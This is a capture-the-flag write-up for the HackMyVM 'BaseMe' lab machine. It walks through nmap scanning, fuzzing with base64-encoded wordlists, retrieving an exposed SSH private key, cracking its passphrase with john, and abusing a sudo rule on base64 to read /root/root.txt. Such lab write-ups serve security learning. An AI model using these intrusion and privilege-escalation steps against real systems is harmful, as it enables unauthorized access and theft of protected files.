@@ -1,0 +1,202 @@
+---
+title: BaseMe
+date: '2025-11-07'
+description: ''
+type: writeup
+platform: hackmyvm
+tags:
+  - base64
+  - Easy
+cover: >-
+  /mc/uploads/2025/11/https___dev-to-uploads.s3.amazonaws.com_uploads_articles_n8ouhu8e2pcw10xfzzvv.webp
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+Hi, today we're going to do an old machine on the **HackMyVM** platform named "**BaseMe**." So, let's start!
+
+## Recon
+
+```text
+ζ nmap -p- 192.168.138.132 -sV                                                 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-07 05:59 EST
+Nmap scan report for 192.168.138.132
+Host is up (0.00034s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp open  http    nginx 1.14.2
+MAC Address: 08:00:27:8C:2A:E7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+So, we're going to check port 80 to see what web server is hosting there.
+
+## Base64 
+
+Using **curl**, let's see what the index page contains.
+
+```text
+
+ζ curl http://192.168.138.132                                                  
+QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK
+
+```
+
+So here we found something encoded in **Base64** and some words. First, we're going to decode the string.
+
+```text
+ζ echo "QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK" |base64 -d
+ALL, absolutely ALL that you need is in BASE64.
+Including the password that you need :)
+Remember, BASE64 has the answer to all your questions.
+-lucas
+
+```
+
+So here we have a hint that we should be using **Base64**. We also got information about a user named '**Lucas**,' which is good. After that, I think the password or a hidden directory might be encoded in **Base64**, so we need to start **brute-forcing** or **fuzzing**. I'm going to start by fuzzing and create a Bash or Python script that takes a wordlist, encodes it to **Base64**, and fuzzes
+
+We're going to encode a small wordlist first
+
+```text
+ζ python3 -c "import base64; [print(base64.b64encode(line.strip().encode()).decode()) for line in open('/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt')]" > /tmp/wordlistbase64
+```
+
+ζ ffuf -w /tmp/wordlistbase64 -u "http://192.168.138.132/FUZZ"  
+:: Progress: \[4746/4746\] :: Job \[1/1\] :: 3773 req/sec :: Duration: \[0:00:01\] :: Errors: 0 ::
+
+The problem here might be the newline. We removed it with `strip()`. Let's go back and try without stripping to see what happens. Hope for the best! :)
+
+```text
+ζ python3 -c "import base64; [print(base64.b64encode(line.encode()).decode()) for line in open('/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt')]" > /tmp/wordlistbase64
+```
+
+we **Fuzz** now
+
+ζ ffuf -w /tmp/wordlistbase64 -u "http://192.168.138.132/FUZZ"  
+aWRfcnNhCg== \[Status: 200, Size: 2537, Words: 1, Lines: 34, Duration: 15ms\]  
+cm9ib3RzLnR4dAo= \[Status: 200, Size: 25, Words: 1, Lines: 2, Duration: 17ms\]  
+:: Progress: \[4746/4746\] :: Job \[1/1\] :: 2631 req/sec :: Duration: \[0:00:02\] :: Errors: 0 ::
+
+We found 2 **endpoints**. Let's decode them.
+
+```text
+ζ echo aWRfcnNhCg== | base64 -d                                                                                                                         
+id_rsa
+ζ echo cm9ib3RzLnR4dAo= | base64 -d                                                                                                                     
+robots.txt
+```
+
+Let's go! We found an endpoint for an **`id_rsa`** file. Hmm, let's check it with `curl`.
+
+```text
+ζ curl http://192.168.138.132/aWRfcnNhCg==
+LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB
+QUFBQ21GbGN6STFOaTFqZEhJQUFBQUdZbU55ZVhCMEFBQUFHQUFBQUJCVHhlOFlVTApCdHpmZnRB......
+Q0tMdnl5WjNlRFNkQkRQcmtUaGhGd3JQcEk2K0V4OFJ2Y1dJNmJUSkFXSgpMZG1tUlhVUy9EdE8r
+NjkvYWlkdnhHQVlvYisxTT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==
+```
+
+## Initial access(Exploit)
+
+It's an SSH key encoded in **Base64**. We're going to decode it and save it to a file.
+
+```text
+ζ curl http://192.168.138.132/aWRfcnNhCg== | base64 -d >ssh_key
+ζ cat ssh_key                                                                                                                                           
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL
+BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1......
+LdmmRXUS/DtO+69/aidvxGAYob+1M=
+-----END OPENSSH PRIVATE KEY-----
+```
+
+Now that we have the key, we're first going to change its permissions to allow us to use it. After that, we'll try to authenticate as the user 'Lucas' since he's the only user we know of for now.
+
+```text
+ζ chmod 600 ssh_key                                                                                                                                     
+ζ ssh lucas@192.168.138.132 -i ssh_key                                                                                                                  
+Enter passphrase for key 'ssh_key': 
+```
+
+The **SSH** key is protected with a passphrase, but we have a tool that can find it. We're going to use `ssh2john`. To crack the **password**, we need a **wordlist**. We can't use a large list like **`rockyou.txt`** because encoding the entire thing would take too much time. Instead, we'll use the first wordlist we found in the website's comments.
+
+```text
+ζ ssh2john ssh_key >hashssh
+```
+
+```bash
+cat ζ cat ~/password.txt
+iloveyou
+youloveyou
+shelovesyou
+helovesyou
+weloveyou
+theyhatesme
+ζ python3 -c "import base64; [print(base64.b64encode(line.encode()).decode()) for line in open('/home/kali/password.txt')]" > /tmp/passwrdbase64
+```
+
+After creating the **password** list, we're going to crack it with `john`.
+
+```text
+ζ john --wordlist=/tmp/passwordbase64 hashssh                                                                                                           
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+aWxvdmV5b3UK     (/home/kali/ssh_key)     
+1g 0:00:00:00 DONE (2025-11-07 06:51) 4.347g/s 26.08p/s 26.08c/s 26.08C/s aWxvdmV5b3UK..dGhleWhhdGVzbWUK
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+## PrivEsc
+
+We found the **password**! Now we can authenticate as the user **Lucas** and see what **permissions** he has.
+
+```text
+ζ ssh lucas@192.168.138.132 -i ssh_key                                                                                                                  
+Enter passphrase for key 'ssh_key': #aWxvdmV5b3UK
+```
+
+```bash
+lucas@baseme:~$ ls
+user.txt
+lucas@baseme:~$ sudo -l
+Matching Defaults entries for lucas on baseme:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User lucas may run the following commands on baseme:
+    (ALL) NOPASSWD: /usr/bin/base64
+```
+
+We can now easily read the flag using **[GTFobins](https://gtfobins.github.io/gtfobins/base64/)**
+
+```bash
+lucas@baseme:~$ sudo base64 /root/root.txt |base64 -d
+                                   .     **                                     
+                                *           *.                                  
+                                              ,*                                
+                                                 *,                             
+                         ,                         ,*                           
+                      .,                              *,                        
+                    /                                    *                      
+                 ,*                                        *,                   
+               /.                                            .*.                
+             *                      ROOOTED  :)                **              
+             ,*                                               ,*                
+                **                                          *.                  
+                   **                                    **.                    
+                     ,*                                **                       
+                        *,                          ,*                          
+                           *                      **                            
+                             *,                .*                               
+                                *.           **                                 
+                                  **      ,*,                                   
+                                     ** *,                                      
+                                               
+HMVFKBS64
+```
